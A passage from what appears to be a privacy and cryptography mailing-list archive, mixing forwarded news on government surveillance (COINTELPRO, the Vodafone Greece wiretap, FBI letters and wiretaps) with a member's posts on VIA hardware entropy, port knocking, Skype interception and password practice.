enemies requires the government to spy on its citizens. The break-in
is far less well known than Daniel Ellsberg's leak of the Pentagon
Papers three months later, but in my opinion it deserves equal
Found among the Media documents was a new word, "COINTELPRO," short
for the FBI's "secret counterintelligence program," created to
investigate and disrupt dissident political groups in the U.S. Under
these programs, beginning in 1956, the bureau worked to "enhance the
paranoia endemic in these circles," as one COINTELPRO memo put it, "to
get the point across there is an FBI agent behind every mailbox."
The Media documents  along with further revelations about COINTELPRO
in the months and years that followed  made it clear that the bureau
had gone beyond mere intelligence-gathering to discredit, destabilize
and demoralize groups  many of them peaceful, legal civil rights
organizations and antiwar groups  that the FBI and Director J. Edgar
Hoover found offensive or threatening.
For instance, agents sought to persuade Martin Luther King Jr. to kill
himself just before he received the Nobel Prize. They sent him a
composite tape made from bugs planted illegally in his hotel rooms
when he was entertaining women other than his wife  and threatened to
make it public. "King, there is one thing left for you to do. You know
what it is," FBI operatives wrote in their anonymous letter.
Under COINTELPRO, the bureau also targeted actress Jean Seberg for
having made a donation to the Black Panther Party. The fragile actress
ultimately committed suicide after a gossip nugget based on a FBI
wiretap was leaked to the L.A. Times and published. The item,
suggesting that the father of the baby she was carrying was a Black
Panther rather than her French writer-husband, turned out to be wrong.
The sheer reach of a completely politicized FBI was one of the most
frightening revelations of the Media documents. Underground newspapers
were targeted. Students (and their professors) were targeted.
Celebrities were targeted. The Communist Party of the U.S.A., the
Southern Christian Leadership Conference, the Student Non-Violent
Organizing Committee, the Black Panther Party, the Women's Strike for
Peace  all were targeted. "Neutralize them in the same manner they
are trying to destroy and neutralize the U.S.," one memo said.
Eventually, the COINTELPRO memos  some from Media and some unearthed
later  prompted hearings led by Rep. Don Edwards of California and by
Sen. Frank Church of Idaho on intelligence agency abuses. In the
mid-1970s, the wayward agency began finally to be reined in.
It is tragic when people lose faith in their government to the extent
that they feel they must break laws to expose corruption.
But a war that had been started and sustained by lies had gone on for
years. And a government had betrayed its citizens, manipulating their
fear to strengthen its grip on power.
Today, again, many people worry that their government may be on the
road to subverting its own ideals. I hope that the commemoration of
those unknown activists being held today in Media, Pa., will serve as
a reminder that fighting for democracy abroad must remain more than
merely an excuse to weaken civil liberties at home.

some additional details on this interesting tap,,,
looks like it was indeed an inside job (and of the vodafone tech's
mysteriously committed suicide after the tapping was exposed? hmmm)
basically they hooked their spyware into the CALEA like features which
come standard in any commercial softswitch implementation and used it
to capture and relay conversations to the pool of a dozen or so pre
paid wireless phones.  [note that CALEA isn't that complicated; it's
simply a one way conference resource attached to a specific
span/channel that is relayed to eve.]
funny how vodafone is trying to avoid any responsibility by
highlighting the fact an ericsson insider wrote the code, while
conveniently failing to mention it was a vodafone tech who put it in
place. :)
The CEO of Vodafone Greece George Koronias told a Parliamentary
investigation on Thursday that Vodafone had at no time purchased the
software used to carry out the illegal phone taps through its digital
systems, while stressing that the people responsible had to have
extremely high technical expertise and a deep knowledge of Ericsson's
programming environment.
During his testimony, Koronias stressed that Vodafone had "not
requested, not ordered and not received" the legal low-phone
interception programme developed by Ericsson, which the phone-tappers
had managed to activate in order to monitor the roughly 100 mobile
phones that were under surveillance.
He said that the low-phone interception programme was added to
Ericsson systems at the request of its customers after the September
11 attacks, but underlined the costly service had not been purchased
by Vodafone.
Koronias also emphasised that the Greek mobile-phone provider had
never been officially aware of the inactive low-phone interception
software's presence in its systems, but only the supplier Ericsson.
At the same time he pointed out that Vodafone, as a provider, would
not be given access to the source code for the software. Ericsson did
not provide this to its customers and the software was operated only
Ericsson's authorised staff, he said.
Asked who might have made the 'rogue' software, Koronias said that it
would have to be someone with intimate knowledge of Ericsson's
programming environment that could write directy in assembly language,
which operators were not able to do.
"The complexity of the programme points to someone with extremely high
expertise," Koronias said, while clarifying that Vodafone's staff did
not possess this level of skill.
Regarding the death of Vodafone staff member Costas Tsalikidis,
Koronias said that he had brought this to the attention of the
ministers and the Supreme Court prosecutor, placing himself and the
company at their disposal, because it had coincided with the discovery
of the 'ghost' software and informing the government.
In a re-opened investigation into Tsalikidis' death that is now
underway, meanwhile, first-instance court prosecutor Ioannis Diotis on
Thursday heard testimony from the coroner Giorgios Dilernia who
examined the body at the time and the head of the coroners' service
Philippos Koutsaftis.
Dilernia said the 39-year-old's death had clearly been caused by
hanging, while both coroners agreed on a verdict of suicide and said
that disinterment of the body would not bring about any result.
Tsalikidis was found hanged in March 2005, just days after the company
discovered the 'ghost' software in its systems and informed the
government. A police investigation at the time had attributed the
death to suicide but this has been questioned by the family,
especially in the light of later developments and the revelations
about the phone-tapping scandal.

 Telling the 'approved' story
March 7, 2006 01:12 AM / The Rant .
By DOUG THOMPSON
On an unspecified day last week an employee of a federal agency that
cannot be revealed delivered a document that cannot be identified to a
company that cannot be named seeking information that cannot be
The aforementioned federal agent left the unidentified document with
an employee of the unnamed company. That employee then called the
owner, who must remain anonymous, to inform him that the document that
could not be identified sought information that could not be
discussed. The owner who must remain anonymous instructed the employee
to deliver the unidentified document to a lawyer whose name is
protected by attorney-client privilege.
The lawyer whose name is protected by attorney-client privilege
examined the unidentified document and then reviewed the information
that could not be discussed with the owner who must remain anonymous.
With the approval of the owner who must remain anonymous, the lawyer
whose name is protected by attorney-client privilege contacted a U.S.
attorney who demanded that his identity be concealed.
The U.S. attorney who demanded that his identity be concealed then
claimed the owner who must remain anonymous violated a law that could
not be disclosed and faced arrest for charges that could not be
specified because he had referred to the document that cannot be
identified in an article for a certain, but unnamed, web site.
The lawyer whose name is protected by attorney-client privilege argued
that his client could not be charged under the undisclosed law because
he had been acting as a journalist at the time of the alleged
publication and not as the owner of the company that cannot be named.
He had, in fact, learned of the existence of the document that cannot
be identified from a third-party, who was not named, and was not aware
of its exact contents because he had not seen or read the document
and, therefore, was not aware of the exact contents that cannot be
The U.S. attorney who demanded his identity be concealed consulted
with others who names are classified and concluded that the owner who
must remain anonymous walked a fine line between legal and illegal and
would not face arrest for violating a law that could not be disclosed
on charges that could not be specified.
So walking this fine line of justice allowed the owner who must remain
anonymous to avoid confinement at an institution at an unknown
location for an unspecified length of time.
In exchange for his freedom, the owner who must remain anonymous
agreed to write a "clarification" of what happened, following the
guidelines for publication laid down by the Bush administration.
Which is what you just read.
the piece which cannot be mentioned because it named the letter which
must remain secret is here:

VIA's naming conventions are annoying; some names refer to the whole
proc, some to just part of the core, and some to the whole
CPU/north/south bridge collection.
IIRC Luke is a smaller fab process (the eden-n) with the
faster/improved north bridge support.  it's still the C5P core (two
entropy sources and AES accel.)
 has some PCI quad port NIC's with the same VIA
rhine chips; unfortunately 2 NIC's is the most i've seen ship on the
(routerboard also has a PCI to 4 x miniPCI adapter that is great for
wireless gear)
i've used the PCI riser/adapter to mount two PCI cards horizontally
off the mini-itx for adding a quad port ethernet (4xtulip) and a quad
mPCI filled with atheros CM9 radios.  best little router you can ask
for, IMHO.
this would be easy (easier at least) with a nano-itx form factor.  i
know they make boards with LVDS video built on, but they seem to be
hard to get ahold of, mainly for OEM applications rather than direct
retail.  it will be interesting to see how this plays out...

yeah, for this you'd need the on board cardbus for wireless card, then
use the two PCI slots for the RAID card and quad-NIC.  as a plus, the
boards with the cardbus slot usually have a compact flash port
underneath if you want a diskless system.
the C3 was a larger fab process and had no padlock engine (neither
entropy or AES).  it's difficult to differentiate between a mainboard
using a C3 and a mainboard using the C5.  this drives me nuts! you
have to look for the keyword "Nehemiah" or verify part/model   and
then Nehemiah may refer to either the C5XL or C5P core (C5XL == single
entropy source, C5P == two entropy sources and AES)

Here's a 1997 paper on "quantum computing in the large" that I had
been asking about:
"Neil Gershenfeld and Isaac Chuang have developed an entirely new
approach to quantum computation that promises to solve many of these
problems. Instead of carefully isolating a small number of qubits, we
use a large thermal ensemble (such as a cup of coffee). Such a system
has ~10^23 degrees of freedom; by applying RF pulses that excite
nuclear magnetic resonances, we can create a tiny deviation from
equilibrium that acts just like a much smaller number of pure qubits."

We don't burn our sources
March 9, 2006 05:25 AM / The Rant .
By DOUG THOMPSON
One of the questions frequently raised by critics of this web site is
"how can you guys have sources the mainstream media doesn't have?"
Good question. We often quote confidential sources in our stories. We
have a choice of depending on such sources or not publishing the
story. If I'm satisfied the sources are accurate I go with the story.
It's a question of trust and, during my 23 years in Washington as both
a journalist and a political operative, I built up a network of
sources I trust and who trust me to protect their identity and not put
them in harm's way. More than 40 years in journalism taught me to
protect such sources at all cost.
Many of those same sources don't trust the so-called "mainstream
media" outlets because they've been burned by journalists who put the
story ahead of protecting those who provide them with the information.
Even worse, the mainstreamers can be downright sloppy when it comes to
protecting those who have such information.
On Monday, I outlined how the Bush Administration has launched an
all-out war on the press, directing attorney general Alberto Gonzales
to go after reporters with subpoenas, wiretaps, monitoring of emails
and surveillance to try and stop leaks about the many questionable
activities of the White House.
I learned about the efforts because the FBI made the incredibly stupid
mistake of sending one of their "National Security Letters" to a
company I own demanding information on one of its clients - me.
Then I confirmed the story with my administration sources and ran with
it on Monday, knowing that even acknowledging receipt of a National
Security Letter could lead to trouble.  The letter was withdrawn after
my attorney negotiated a deal.
On Tuesday, an email arrived from Dan Eggen, Justice Department
correspondent for The Washington Post. Dan wanted a copy of the letter
and more information on the story.
That's right I write a story about how the Bush administration is
monitoring the email of journalists and a journalist fires off an

FBI sent the letter to my web hosting company offices which are 300
miles away from my home and studio. At my instructions it went from
the employee who received it straight to my attorney and he dealt
directly with the feds. I never saw the letter, do not know what
happened to it and am not privy to details of what it said. I don't
want to know. That's why I'm still sitting here and not on my way to

Security Agency monitors telephone and email use of, you guessed it,

In 1981 I served on a panel discussion with Fred Graham, then legal
correspondent for CBS News.  During a break I told him about a paper I
once worked for, The Alton Telegraph in Illinois, which had lost a
landmark libel suit for something they never published. I thought it
might make a good story about injustice.
Instead, Graham turned the story over to Morley Safer and 60 Minutes
and they put together a hatchet job on the newspaper and told the
story from a trial lawyer's point of view. Instead of defending
freedom of the press, Safer and his crew sensationalized the story for
Some years later, we would learn again just how 60 Minutes and CBS
News hangs people out to dry. Jeffrey Wigand, a fired corporate vice
president for Brown & Williamson Tobacco Co., blew the whistle on the
company's campaign to hide the true dangers of nicotine. But 60
Minutes and Mike Wallace caved to corporate pressure and shelved the
story after revealing Wigand's identity. His reputation was ruined by
the network's incompetence.
Given such track records, why should any source trust the
mainstreamers?  The Washington Post sends an unsecure email openly
asking me to violate federal law by turning over a classified document
and I'm supposed to believe they will protect sources that I've
cultivated and protected for more than two decades?

My sources know better than to use phone lines and email to contact

sharing information. I'm not about to risk their confidentiality with
reporters who are less careful.
I've been hauled in front of grand juries by overzealous prosecutors
who wanted names of sources. They didn't get them. As a journalist, I
was trained to develop my own network of sources, not call other
reporters and ask them to give up theirs.
Maybe I'm too old-fashioned for today's pop-culture journalism. Maybe
it's out of style for reporters to do their own legwork and research
instead of depending on Google and others to do it for them.
Or maybe I'm just too old to change and too damn suspicious to get
trapped by youngsters. My mama drowned the dumb ones.

see also Via unveils high performance mini-ITX line
Mar. 13, 2006
Via has announced a next-generation family of mini-ITX boards based on
its new C7 processor family. "Epia EN" boards will offer a large
performance boost over previous Epia boards, Via says. They target
thin clients, car PCs, robotics, medical equipment, kiosks, and server
(Click for larger view of Via Epia EN)
Initial Epia EN boards will feature C7 processors clocked at 1.5GHz,
or else an "Eden" version of the C7 clocked at 1.2GHz, for passively
cooled applications. Advanced features include support for 533/400MHz
DDR2 RAM, gigabit Ethernet, and an onboard SATA II RAID 0, 1, and O+1

The EN-series will eventually offer models clocked to 2GHz, with
frontside-bus speeds up to 800MHz, Via says.
First C7-equipped mini-ITX boards from Via
The Epia EN boards will be the first mini-ITX boards to feature Via's
next-generation x86-compatible processors, the C7 desktop, C7-M
mobile, and C7-Eden embedded processors. All three are based on the
same "C5J Esther" core, with different testing requirements and
Touted features of the C5J Esther core include support for SSE2 and
SSE3 instructions, said to improve 3D performance; a full-speed FPU
(floating point unit), rather than the half-speed unit of earlier Via
chips; 16 pipeline stages; and 128KB each of L1 and L2 cache. The core
also integrates Via's cryptography hardware. It has a die size of 30
square millimeters, and is manufactured by IBM using 90-namometer SOI
(silicon-on-insulator) technology.
C7 die layout
(Click to enlarge)
The C7-series chips have a TDP (thermal design power, aka maximum
power draw) of 12 Watts when clocked at 1.5GHz, Via says -- or about
half that of a Celeron-M. Additionally, the chips dissipate 20 Watts
when clocked at 2GHz, Via says, and offer better performance-per-Watt
than Intel's venerable Pentium M, it claims.

Via announced the C7 in May of last year -- see that announcement for
lots more details about the chip.
CN700 Northbridge
Along with new C7 and C7-M processors, the Epia EN-series boards will
use Via's relatively new CN700 chipset, which just began sampling in
December. The chipset includes a new "CN700" northbridge, along with a
VT8237-series southbridge connected through a V-link host controller.
The C7 processor, CN700 northbridge, and VT8237-R southbridge function diagram
(Click to enlarge)
Claimed performance leap
Benchmarking against older mini-ITX boards based on C3 processors
shows the C7-based Epia EN-series boards to offer 55 percent better
results on MPEG encoding, 40 better results on business productivity
performance, and about 10 percent better results on 3D graphics
performance tests, Via reports.
C3 v. C7 benchmark results
(Source: Via)
In addition to better performance, and performance-per-Watt, Via says
the EN-series boards are more reliable, thanks to low heat
dissipation. They are not as dependent as most boards on mechanical
cooling systems, and don't generate enough heat to damage board
components, Via says.
Other claimed features include:
    * ATX power
    * DDRII 400/533 memory socket
    * UDMA 66/100/133 connectors
    * CN700 Northbridge
    * VT8237R+ Southbridge
    * PCI connector
    * LVDS/DVI modules available
    * 6-channel audio
    * Switchable (jumpers) S/PDIF / S-Video port
    * PS-2 connectors
    * USB 2.0
    * Gigabit Ethernet
Via has not announced specific EN-series board availability, but says
that boards will be available at a variety of price points soon.

various political reasons this has never seemed to go anywhere.  i
posted a patch for gcc 3.x a while back if anyone wants to build the

@_subject: for the bored: test an iso (esp those with via padlock hw) 
if you'd like to help me test some crypto pieces the following ISO
includes a test mode which gathers stats and hardware info.  feel free
to trim whatever from this report and send me the remainder. additional modes support a network-less key management mode and a
network enabled instance and cd/dvd writing clone mode.
i'm curious about the following mainly:
- does it boot?
- is network hardware (no wireless) detected in 'net' target?
- does entropy mgmt on VIA hardware work? (c5test/c5keys/c5net)
- does the clonecd/clonedvd work with your hardware? (clone)
- are the key mgmt tools provided sufficient/working? (gpg, openssl, ssh)
feedback appreciated.  please note the test mode may take a loooong
time (30 mins not uncommon).  also note you may be left with a single
seeder on a slow DSL line, which might take a while as well.

you can run this without any disks for the security conscious.  the
full project is intended for release at defcon this year.  hope to see

@_subject: The topology of covert conflict 
an interesting paper...
"Abstract. Often an attacker tries to disconnect a network by
destroying nodes or edges, while the defender counters using various
resilience mechanisms. Examples include a music industry body
attempting to close down a peer-to-peer file-sharing network; medics
attempting to halt the spread of an infectious disease by selective
vaccination; and a police agency trying to decapitate a terrorist
organisation. Albert, Jeong and Barabasi famously analysed the static
case, and showed that vertex-order attacks are effective against
scale-free networks. We extend this work to the dynamic case by
developing a framework based on evolutionary game theory to explore
the interaction of attack and defence strategies. We show, first, that
naive defences don't work against vertex-order attack; second, that
defences based on simple redundancy don't work much better, but that
defences based on cliques work well; third, that attacks based on
centrality work better against clique defences than vertex-order
attacks do; and fourth, that defences based on complex strategies such
as delegation plus clique resist centrality attacks better than simple
clique defences. Our models thus build a bridge between network
analysis and evolutionary game theory, and provide a framework for
analysing defence and attack in networks where topology matters. They
suggest definitions of efficiency of attack and defence, and may even
explain the evolution of insurgent organisations from networks of
cells to a more virtual leadership that facilitates operations rather
than directing them. Finally, we draw some conclusions and present
possible directions for future research..."

@_subject: [Clips] Port knocking: A security idea whose time has come 
my comments below,
limit even attempted utilization of services to authenticated users -
that's a good idea.  port knocking is a poor implementation though.
you can do strong single packet authentication without the additive
latency of port knocking, and it is a cleaner design. (see
 for
i've talked about IPsec stacks keyed out of band which give you a
robust "authenticated peers only" configuration without esoteric port
knocking / SPA methods.  unfortunately right now the options available
are static pre shared key (setkey) which is insecure without some
scripting/munging around single use keys. (this should change soon,
for some lax definition of 'soon')
it'd be nice to expand the keying options for those who wish to avoid
exposing any services above the IP stack without proper
authentication. (that means no IKE ports either).  i'm a huge fan of
OpenVPN and IPsec private networking, though IPsec is better suited
for this "no services for the unauthenticated" mode of operation.
this is the only thing port knocking it has going for it; SPA or VPN's
are a much stronger solution.
this is a particularly significant concern over wireless networks, and
when you add sophisticated authentication you might as well jump ship
to SPA or VPN instead (since you're going to be spending additional
effort managing credentials anyway - do it right and be done with it!)

it's interesting to note that this clearly allows for a MITM as
required by legal authorities (Skype mentioned fully cooperating with
authorities as required - how often do they do this?).
the client authentication uses public keys signed by the Skype
Authority; presumably any key they sign as being "User Alice", even if
belonging to "User Eve", will be accepted by the client.  with no
visibility in client certs at the UI level i don't see how this can be
note that this is really just useful for inter-skype calls as
CALEA/traditional taps can take place once a skype call hits POTS.
one of the slides mentions: "You are the certification authority - You
can intercept and decrypt session keys".  if this means that client
private keys are also handed to the skype authority then eavesdropping
is trivial (and no longer requires active MITM).  however, this tidbit
is listed under "Skype Voice Interception - Feasibility of a man in
the middle attack" so i'm not sure if they are talking about a passive
eavesdrop or an active MITM with regards to the cert authority
other interesting bits:
they use a 2^32 strength key for RC4 obfuscation of data payloads. all this encryption is purely done to obfuscate protocol.  (the binary
obfuscation is impressive as well; i fucking hate that shit though :)

Lawyer thinks office was searched in secret
Surveillance - A Portland attorney, who represents a Saudi, cites
suspicious circumstances
Tuesday, March 21, 2006
BRYAN DENSON
A Portland lawyer suspects that federal authorities executed
warrantless searches of his Lloyd Center office to collect information
about a client who is the subject of an international terrorism
Tom Nelson, who represents Saudi national Soliman al-Buthi, previously
filed a complaint that alleged warrantless interception of phone and
e-mail communications between al-Buthi and his other lawyers.
"We allege in our complaint not only that they intercepted
communications without a warrant, but they used the interceptions to
the disadvantage of the client," Nelson said.
Nelson thinks government agents, with no judicial supervision, entered
his office on a number of occasions last year. He first raised the
suspicion in September in a letter to Karin Immergut, the U.S.
attorney for Oregon, who wrote back saying she was aware of no such
warrantless searches. Nelson recounted his fears about warrantless
searches by the National Security Agency in a story this week in U.S.
News & World Report.
Two years ago, the federal government charged al-Buthi, who headed an
Ashland nonprofit called al-Haramain Islamic Foundation, with taking
charitable donations totaling $130,000 in traveler's checks out of the
United States. Federal authorities have accused the al-Haramain parent
organization, based in Saudi Arabia, of ties to Osama bin Laden.
Nelson thinks that while he was representing al-Buthi on the criminal
charge and attempting to rid his client of a suspected "global
terrorist" designation that someone posing as a janitor repeatedly
tried to, and apparently did, enter his Lloyd Center office after
Attorney Jonathan Norling, who shares office space with Nelson, said
he was sleeping on a couch at their practice early one morning last
May when a man dressed as a custodian tried to enter Nelson's office.
Norling startled the man twice one night in July when he caught the
man trying to enter the locked office.
Norling also suspects federal authorities were trying to collect
information from Nelson's desk and computer. Whoever it was, he said,
had a badge for the building that appeared valid.
"This person clearly wasn't a cleaning crew," Norling said. "I know
the cleaning crew. They come in at different times. They have a cart,
and this guy didn't have a cart. . . . I've worked here seven years,
and I've worked a lot of late nights, and I never experienced anything
like that until Tom was working (on this case)."
Nelson was suspicious of the government, having briefly represented
Brandon Mayfield, the lawyer wrongly accused of the 2004 terrorist
attack in Spain. Mayfield was the subject of intense federal
Nelson's suspicions deepened when he found that his computer had
inexplicably been rebooted and that papers in his cluttered office had
been moved around. "I'm not the world's best housekeeper," he said,
"but I know where things are."
After a few suspicious experiences, Nelson took his al-Buthi files to
his home in Zigzag. There he experienced what he described as
unexplained lapses in his burglar alarm, failures that the company
that monitors the alarm couldn't adequately explain.
On Sept. 23, he fired off the first of two letters to Immergut, the
U.S. attorney for Oregon, complaining of "strong indications that my
office and my home have been the target of clandestine searches"
related to the al-Buthi case. Immergut responded Jan. 19 that she
stood by her earlier statements: She was aware of no such searches
under her watch. Immergut wrote that she assumed he was referring to
news reports about clandestine intercepts by the NSA.
Immergut pointed out in her response that the NSA and Department of
Justice were separate agencies. In an interview Monday, she added,
"The (NSA) is not required to come to the U.S. attorney for the
district of Oregon for authorization to conduct any kind of searches."
All of which keeps Nelson scratching his head.
"I have no proof the government's doing these things," he said. "I
just have a very healthy suspicion they are."

@_subject: entropy status / benchmarks [was test an iso] 
for those with VIA/Intel/AMD hw entropy device support and a running
mtrngd you can get current status via '/etc/rc.d/rcS.mtrngd status'. logs are in /var/log/mtrngd/.
i'd be interesting in knowing run times for large amounts of entropy
gathered and mixed to /dev/random (gigabytes if it remains stable for
that long).  particularly for the Intel and AMD hw devices which i do
not currently have at my disposal for testing.
status output is similar to the following; sizes are in Bytes,
times/stats are in microseconds (not milli):
[Fri Mar 24 08:46:14-459926] Current MTRNGD Status:
  bad fips blocks ......: 13080
   monobit failures ___: 3359

   cont run failures __: 35
  good fips blocks .....: 41614750

24018      total: 179159453561
you can stress /dev/random via 'bench-rng /dev/random 1024 1000000' or
simply 'cat /dev/random > /dev/null'.
uptime would be helpful.  note that i accidentally left "forgiving
fips check" set in the rcS.mtrngd script; this can be turned off for a
better real world test.  the forgiving option does not fail blocks
with poker or bit runs.  monobit, long, and continuous runs are always
critical and the block is discarded.
the FIPS check block size is 1500 bytes.  see
 for more info.
by default entropy density is at 80% so take that into consideration
when calculating available /dev/random throughput.  ex:
entropy add bytes ....: 104036872320  x  0.80 == 83,229,497,856 Bytes
of actual entropy added to /dev/random pool.

Creating a secure password:
    o Include punctuation marks and numbers.
    o Mix capital, lowercase and space characters.
    o Create a unique acronym.
    o Short passwords should be 8 chars at least.
Weaknesses to avoid:
    o Don't use a password that is listed as an example or public.
    o Don't use a password you have been using for years.
    o Don't use a password someone else has seen you type.
    o Don't use a password that contains personal information.
    o Don't use words or acronyms that can be found in a dictionary.
    o Don't use keyboard patterns (qwerty) or sequential numbers.
    o Don't use repeating characters (aa11).
Keep your password secure:
    o Never tell your password to anyone or use it where they can observe it.
    o Never send your password by email or speak it where others may hear.
    o Occasionally verify your current password and change it to a new one.
    o Avoid writing your password down.  (Keep it with you in a purse
or wallet if you have to write down the password until you remember

minimum of 128 bits of entropy in a full SHA-512 derived key.  exotic

ideally this would be coupled with a personal vascular scan biometric
device (user centric with vascular auth challenge to open/sign

the odds of such a device being designed, produced and verified in an

excessive typing == unnecessary leaked information and longer auth
process (acoustic, profiling, easier pattern discovery, etc.)
i don't have a problem supporting a passphrase mode (>16 chars?  >32?)
but i'd rather not make it the default.

this to be trustworthy and widely usable)

very true.
it is my personal hunch that if users had just one password they
needed to remember they could remember a good one.  the janus stuff we
are working on uses loop-aes volumes specifically so you can store
passwords in a browser, store capability URL's, keep accounts and
logins in a text file, etc.
[i'd love to know of any studies to this end though.  i have tried
experiments to see just how much entropy i can commit to memory and it
is more than enough for a good interactive authentication.  i think
this is within the ability of most, if they had a desire to do so and
understood the benefit.]
so the goal is to provide a usable system with a single password, and
make it user centric, so that all the other credentials and secrets
associated with other digital identies can benefit from this bootstrap
(and presumably share this more secure bootstrap).

true; which is why i'd like to see them use a single good password to
mount an encrypted volume and secure OS where the rest of the
(different*) passwords and PIN's and whatever else are kept.
this is a handy utility!
i'd still be concerned about dictionary attacks on poor passwords
(that is, discovering '.848fe29s44j' is the hash for pwned.com and
'secret'.)  secure digests make this more expensive but not by much.
* are you aware of any utility for the browser that generates random
passwords?  i'd like something like this as well, with the idea that
the first time you visit the site (or need to change a password) a
random password is generated, placed in the input text field, and then
the browser password manager remembers it after that point.  (and the
password db is stored on an encrypted file system to prevent theft).
someone will ask about users who aren't on their machine and need to
access a site.  i don't like to support this ability because you
should never be using an untrusted computer to access a secure site. if the computer is trusted you should also be able to boot from CD and
insert your USB storage key (which lets you use your browser password
(actually, looking at the source for PwdHash it appears easy enough to
modify for random password generation)

fine as long as trust and identity are properly implemented. physically hardened tokens are very good (ex: the rsa challenge / pin
based token authenticator via radius)
SPEKE and variants are also highly recommended in my book if you can
use them in a secure context (that is, no rootkits and equivalents to
capture passwords/phrases - a situation where single use passwords /
bingo auth are helpful if secure hardware tokens are not feasible)
this works very well, and if you have hardware accelerated encryption
it can be transparent.  you can also pre distribute keys (public and
secret) to the encrypted volumes you mount and run within (via a
secure bootstrap of course...)

i think this is a rich field of discovery when considering the user

look at using a quorum based key distribution and agreement protocol
(where quorum == a specific subset of group key management) with
regular attestation / rekeying via trusted and strongly authenticated
mechanisms.  session timeout (for failure / lack of consensus /
malicious attack) should be detected within an appropriate time frame
for the user to respond securely.  (i tend to think 60 seconds is an
acceptable window)
doing this in a user friendly manner is very difficult and probably

References: <343538103.05175
hi jinz,
i don't have time for a detailed reply but i thought a little more
info would be useful
i mentioned quorum systems and group key distribution to achieve a
shared and authenticated state among a group of peers that can be kept
in sync / coherent via frequent attestation (group re keying with
quorum consensus to distribute new keys).
there are many ways to implement this so i'll stick to conceptual
features / attributes and how this relates to a private group network
system we are implementing.
quorum authorities are those who sign all the other authorities keys
as part of the group key distribution.  quorum  or group members are
those who receive keys from one or more quorum authorities.
the quorum authorities maintain an index of all known / trusted group
members and the trust metrics assigned to the roles / services they
can perform.
and peer may solicit, provide and consume the services of another once
they verify they are trusted to do so.  they can contact any of the
quorum authorities (who have a full index and trust metric state /
graph) to certify the remote peer before doing so.
a group authorities may issue a revocation signed by his current group
identity key to disband the quorum / group.
if consensus cannot be reached within the next group re-key interval
(due to failure, lack of consensus at the meatspace / user level, or
malicious attack / DoS) the group must be re-keyed from the face to
face ground up and all reputation rebuilt.
the identifiers signed by the quorum during each iteration consist of:
- the key digests for each authority for the next group key exchange
- the sha-256 digest of the current base share file state image
(includes base OS and private group files/keys)
- the sha-256 digests of all delta based overlay filesystem images. these are optional among group members but mandatory for all quorum
upon this base you can build / tie to various group synchronization
mechanisms that are strongly authenticated and yet still fully
i hope that helps.

CUBAN SPY CASE
Feds bugged bedroom, phones of FIU pair
New court evidence in the Cuba spy case reveals the United States
used wiretaps for years before agents arrested an FIU professor and
his counselor wife.
BY JAY WEAVER
jweaver at MiamiHerald.com
Federal agents planted a bug in the bedroom of a Florida
International University a couple of years ago, netting evidence to
charge them as unregistered agents for the Cuban government,
according to court records.
The FBI also wiretapped the home phones of Professor Carlos Alvarez
and his counselor wife, Elsa Alvarez, from at least late 2001 until
last summer, collecting electronic evidence on practically all of
their conversations.
The reams of intercepts included mundane exchanges and even the
private musings between husband and wife.
The FBI's eavesdropping of the couple's home goes far beyond what was
first known about evidence in the case, which included alleged
''confessions'' to federal agents last summer and the confiscation of
the Alvarezes' home and FIU computers. The surveillance evidence
surfaced as part of their lawyers' efforts to revoke the couple's
detention before their scheduled May 8 trial.
It's unclear from the court record how these thousands and thousands
of surveillance intercepts will help the U.S. attorney's office
prosecute the couple, who are suspected of reporting on the exile
community and its leaders to Cuban leader Fidel Castro's government.
According to sources familiar with the case, the FBI had hoped the
electronic intercepts would provide leads on alleged spying activity
on behalf of the Cuban government. The evidence led only to the
Alvarezes' arrests in January. It's unclear why prosecutors chose to
charge them at that time.
The couple's lawyers say prosecutors have produced ''about 200
supposedly pertinent conversations'' recorded by the FBI, court
records show. The evidence remains sealed from the public. But the
Alvarezes' lawyers say the ''majority deals only with mundane
activities of daily life'' -- such as conversations about the
Alvarezes' dinner plans, the tenting of their South Miami home for
termites and meetings at their Catholic church.
THE DEFENSE STANCE
The couple's lawyers, Steven Chaykin and Jane Moscowitz, argue their
clients would not leave for Cuba if released because they have strong
ties to the community, including five children and elderly parents.
They are challenging whether the FBI lawfully obtained warrants to
conduct the electronic surveillance. The FBI obtained the warrants
under the Foreign Intelligence Surveillance Act, which allows the
government to wiretap people in the United States suspected of being
agents for a foreign government or involved in terrorist activity overseas.
In the war on terror, the Bush administration has attracted sharp
criticism for authorizing warrantless domestic wiretaps without
approval from the secretive FISA court -- an issue that doesn't apply
to the Alvarez case.
It is not clear from court records how long the FBI conducted
electronic surveillance of the couple's home. But it appears the FISA
wiretaps of the Alvarezes may have begun years before the Sept. 11,
2001, terrorist attacks. Post-9/11, Congress approved the USA Patriot
Act that allows federal agencies to use foreign intelligence wiretap
evidence for criminal investigations, such as the Alvarezes' case.
'On March 6, 2006, the government produced summaries of allegedly
`pertinent' recorded conversations produced by that surveillance
starting in December 2001 and ending July 4, 2005, although the
government states that the eavesdropping began earlier and continued
until the defendants' arrest on Jan. 6, 2006,'' the Alvarezes' lawyers wrote.
The attorneys, in their motion, asked the government to disclose the
documents related to the wiretap warrants. They are trying to
challenge evidence that could affect their clients' case before a jury.
They cited constitutional protections for Carlos Alvarez, 61, a
psychology professor, and his wife, Elsa, 55, a psychology counselor,
both U.S. citizens.
Referring to the FISA law, the attorneys said: No U.S. citizen ``may
be considered an agent of a foreign power solely upon the basis of
activities that are protected by the First Amendment. . . .''
For example, they argued, more than 40 of the ''pertinent'' FISA
recordings are telephone conversations between Carlos Alvarez and an
unidentified colleague regarding legally licensed culture-exchange
programs between the United States and Cuba.
PROTECTIVE ORDER
This month, federal prosecutors refused to turn over documents for
the FISA warrants to the Alvarezes' attorneys.
So far, U.S. District Judge K. Michael Moore has issued a protective
order that allows only members of the legal teams and their staffs to
review the declassified FISA intercepts for the upcoming trial.
Prosecutors apparently disclosed evidence about the FISA wiretaps to
show the judge that the Alvarezes are a ``serious risk of flight.''
Assistant U.S. attorney Brian Frazier cited Magistrate Judge Andrea
Simonton's January ruling in which she said the couple would receive
''a hero's welcome'' in Cuba.
The prosecutor said the couple used their cover at FIU to infiltrate
the exile community, spying on the university's president, Mitch
Maidique, and other exile leaders. He said they secretly communicated
with the Cuban intelligence directorate, using five-digit code in
short-wave radio transmissions.
Once the messages were received, they would input them into their
home computer, equipped with decryption technology.
Prosecutors say the couple traveled to Cuba, Mexico and other
countries to exchange information with their handlers from the Cuban
Directorate of Intelligence.
According to court filings, the Alvarezes reported on ''community
attitudes'' after the FBI's 1998 arrests of 10 Cubans charged with
spying. That high-profile espionage case was linked to the Cuban
government's shoot-down of two Brothers to the Rescue exile planes
